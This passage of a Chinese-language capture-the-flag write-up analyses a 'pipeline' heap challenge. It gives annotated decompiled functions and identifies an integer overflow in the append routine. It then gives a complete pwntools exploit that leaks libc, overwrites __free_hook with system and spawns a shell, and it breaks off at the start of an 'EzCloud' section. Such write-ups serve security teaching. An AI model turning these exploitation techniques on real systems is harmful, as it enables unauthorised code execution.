class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_15B5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = sub_1391(<span class="number">24</span>);<span class="comment">// malloc函数，堆块大小0x18</span></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( qword_4058 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">1</span>;<span class="comment">// v1 = idx</span></span><br><span class="line">    v2 = qword_4058;<span class="comment">// v2 = memsize</span></span><br><span class="line">    <span class="keyword">while</span> ( *(_QWORD *)(v2 + <span class="number">16</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(_QWORD *)(v2 + <span class="number">16</span>);</span><br><span class="line">      ++v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v2;</span><br><span class="line">      *(_QWORD *)(v2 + <span class="number">16</span>) = s;<span class="comment">// 在0x10的位置上填入下一个buff的地址，证明这是一个链式结构</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> sub_1422((<span class="keyword">unsigned</span> __int64)s);<span class="comment">// checkerr函数</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> __int64)s;</span><br><span class="line">    qword_4058 = (__int64)s;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>新增结构体<code>pipe</code>：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> *malloc_addr;</span><br><span class="line">  <span class="keyword">int</span> offset;</span><br><span class="line">  <span class="keyword">int</span> size;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">next_ptr</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>映射<code>v2</code>为<code>pipe</code>结构体，去掉类型转换后，代码就清晰很多了：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct pipe *<span class="title">sub_15B5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">v2</span>;</span> <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = sub_1391(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( qword_4058 )<span class="comment">// 首次qword_4058为空，第一次运行后会进行赋值</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">1</span>;</span><br><span class="line">    v2 = qword_4058;</span><br><span class="line">    <span class="keyword">while</span> ( v2-&gt;next_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = v2-&gt;next_ptr;</span><br><span class="line">      ++v1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v2;</span><br><span class="line">      v2-&gt;next_ptr = s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> sub_1422(s);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = s;</span><br><span class="line">    qword_4058 = s;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>edit函数，实际上虽然叫edit函数，却是新建另一个堆的过程：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct pipe *<span class="title">sub_16B5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">v2</span>;</span> <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = sub_1540(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  result = sub_1651(v1);</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    result-&gt;offset = sub_1540(<span class="string">&quot;offset: &quot;</span>);</span><br><span class="line">    v2-&gt;size = sub_1540(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    v2-&gt;malloc_addr = sub_13CA(v2-&gt;malloc_addr, v2-&gt;size);<span class="comment">// realloc</span></span><br><span class="line">    <span class="keyword">if</span> ( v2-&gt;malloc_addr )<span class="comment">// 存储再v2结构体的头8位字节</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v2-&gt;offset &gt;= v2-&gt;size || (result = v2-&gt;offset, result &lt; <span class="number">0</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v2;</span><br><span class="line">        v2-&gt;offset = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2-&gt;size = <span class="number">0</span>;</span><br><span class="line">      v2-&gt;malloc_addr = <span class="number">0LL</span>;</span><br><span class="line">      result = v2;</span><br><span class="line">      v2-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这里我们来复习一下realloc函数：</li></ul><blockquote><p><code>void *realloc (void *ptr, size_t new_size );</code></p><p><code>realloc</code>函数用于修改一个原先已经分配的内存块的大小，可以使一块内存的扩大或缩小。当起始空间的地址为空，即<code>*ptr = NULL</code>,则同<code>malloc</code>。当<code>*ptr</code>非空：若<code>nuw_size &lt; size</code>,即缩小<code>*ptr</code>所指向的内存空间，该内存块尾部的部分内存被拿掉，剩余部分内存的原先内容依然保留；若<code>nuw_size &gt; size</code>,即扩大<code>*ptr</code>所指向的内存空间，如果原先的内存尾部有足够的扩大空间，则直接在原先的内存块尾部新增内存，如果原先的内存尾部空间不足，或原先的内存块无法改变大小，<code>realloc</code>将重新分配另一块<code>new_size</code>大小的内存，并把原先那块内存的内容复制到新的内存块上。因此，使用<code>realloc</code>后就应该改用<code>realloc</code>返回的新指针。</p></blockquote><ul><li>实际上这里的堆块结构如下图：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x56134a4822b0:0x00000000000000000x0000000000000021</span><br><span class="line">0x56134a4822c0:0x00000000000000000x0000000000000000 malloc_addr, size offset</span><br><span class="line">0x56134a4822d0:0x000056134a4822e00x0000000000000021 next_ptr</span><br><span class="line">0x56134a4822e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x56134a4822f0:0x000056134a4823000x0000000000000021</span><br></pre></td></tr></table></figure><ul><li><p><strong>也就是说，当我们add函数申请chunk时，<code>malloc_addr</code>和<code>size</code>、<code>offset</code>是不初始化的。而他们的初始化是在edit函数进行的。后面的append和show函数是对malloc_addr上存储的堆进行操作的，destory函数则是对链式结构堆进行操作的。</strong></p></li><li><p>回过头来看到初始化函数：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_1288</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  qword_4050 = (__int64)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);<span class="comment">// 第一个申请的堆块地址</span></span><br><span class="line">  *(_QWORD *)qword_4050 = qword_4050 + <span class="number">16</span>;<span class="comment">// 堆中前8位字符存放着qword_4050 + 16</span></span><br><span class="line">  *(_QWORD *)(qword_4050 + <span class="number">8</span>) = <span class="number">0x21000</span>LL;<span class="comment">// 后8位字符存放着整个内存的大小0x21000</span></span><br><span class="line">  <span class="keyword">return</span> alarm(<span class="number">0x78</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>checkerr函数，需要保证申请的堆块不能超出初始化的第一个堆块地址到0x21000的范围：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_1332</span><span class="params">(<span class="keyword">unsigned</span> __int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; *(_QWORD *)qword_4050 || (result = *(_QWORD *)qword_4050 + *(_QWORD *)(qword_4050 + <span class="number">8</span>), a1 &gt;= result) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>destory函数，只是一个脱链操作，并没有真正的free掉：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct pipe *__fastcall <span class="title">sub_178A</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">v4</span>;</span> <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = sub_1540(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  result = sub_1651(v3, a2);<span class="comment">// 取第v3个堆块的指针函数，但是要保证链不能断</span></span><br><span class="line">  v4 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( result == qword_4058 )</span><br><span class="line">      qword_4058 = result-&gt;next_ptr;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_1651((v3 - <span class="number">1</span>), a2)-&gt;next_ptr = result-&gt;next_ptr;<span class="comment">// 将next_ptr指针赋值给前一个</span></span><br><span class="line">    sub_1422(v4-&gt;malloc_addr);</span><br><span class="line">    <span class="keyword">return</span> sub_1422(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>append函数，这里存在整型溢出，如果v5取一个负数，那么就可以绕过验证，这样就可以扩大v3的值，实现数组溢出：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct pipe *__fastcall <span class="title">sub_1819</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">v6</span>;</span> <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_1540(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  result = sub_1651(v4, a2);</span><br><span class="line">  v6 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    result = result-&gt;malloc_addr;</span><br><span class="line">    <span class="keyword">if</span> ( v6-&gt;malloc_addr )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = sub_1540(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">      v3 = v6-&gt;size - v6-&gt;offset;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &lt;= v3 )<span class="comment">// 如果要输入的大小小于size - offset，存在整型溢出</span></span><br><span class="line">        LOWORD(v3) = v5;<span class="comment">// loword取出低16位</span></span><br><span class="line">      <span class="keyword">return</span> sub_1453(&amp;v6-&gt;malloc_addr[v6-&gt;offset], v3);<span class="comment">// 从offset处继续开始写</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>show函数：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_18B9</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">v5</span>;</span> <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_1540(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  v2 = sub_1651(v4, a2);</span><br><span class="line">  v5 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v2-&gt;malloc_addr;</span><br><span class="line">    <span class="keyword">if</span> ( v5-&gt;malloc_addr )</span><br><span class="line">      LODWORD(v2) = <span class="built_in">printf</span>(<span class="string">&quot;data: %s\n&quot;</span>, &amp;v5-&gt;malloc_addr[v5-&gt;offset]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>思路：<ul><li>由于没有free函数，我们需要使用<code>realloc(0)</code>替代。</li><li>先使用edit函数申请一个0x400以上的堆块，free成为unsorted bin后，再申请回来，从而泄露libc地址。</li><li>输入一个负数实现数组溢出，这里输入的是<code>-0x7fffff00</code>，在计算机中表示为<code>0x7fffff00</code>的补码，即<code>0x8000100</code>，绕过检测后取低16位，即赋值<code>v3</code>为0x100，可以读入0x100个字符。</li><li>数组溢出后可以改写下一个链式结构，包括其<code>malloc_addr</code>地址，最后实现任意地址写，将<code>__free_hook</code>地址改写为<code>system</code>函数地址。</li></ul></li><li>脚本：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pipeline&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pipeline&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">   cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   init-pwndbg</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line">   gdb.attach(sh, cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">cho</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="built_in">str</span>(cho))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span></span><br><span class="line">   choice(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, offset, size</span>):</span></span><br><span class="line">   choice(<span class="number">2</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;offset: &#x27;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destory</span>(<span class="params">idx</span>):</span></span><br><span class="line">   choice(<span class="number">3</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">append</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">   choice(<span class="number">4</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;data: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">   choice(<span class="number">5</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add() <span class="comment"># 0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x1000</span>)</span><br><span class="line">add() <span class="comment"># 1 防止合并到top chunk</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x1000</span>) </span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">libc.address = u64(sh.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">add() <span class="comment"># 2</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0xff</span>, <span class="number">0x100</span>)</span><br><span class="line">add() <span class="comment"># 3</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">add() <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line">append(<span class="number">4</span>, <span class="number">0x40</span>, <span class="string">&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">append(<span class="number">2</span>, -<span class="number">0x7fffff00</span>, flat([<span class="string">&#x27;a&#x27;</span>, <span class="number">0</span>, <span class="number">0x21</span>, libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>], <span class="string">&#x27;\n&#x27;</span>]))</span><br><span class="line">append(<span class="number">3</span>, <span class="number">0x30</span>, flat([libc.sym[<span class="string">&#x27;system&#x27;</span>], <span class="string">&#x27;\n&#x27;</span>]))</span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="EzCloud"><a href="#EzCloud" class="headerlink" title="EzCloud"></a>EzCloud</h3><ul><li>这是一道虚拟化方向的题目，参考链接：<a href="https://matshao.com/2021/06/15/QWB2021-Quals-EzCloud/">https://matshao.com/2021/06/15/QWB2021-Quals-EzCloud/</a></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+4h] [rbp-5Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  __int64 buf[<span class="number">10</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span 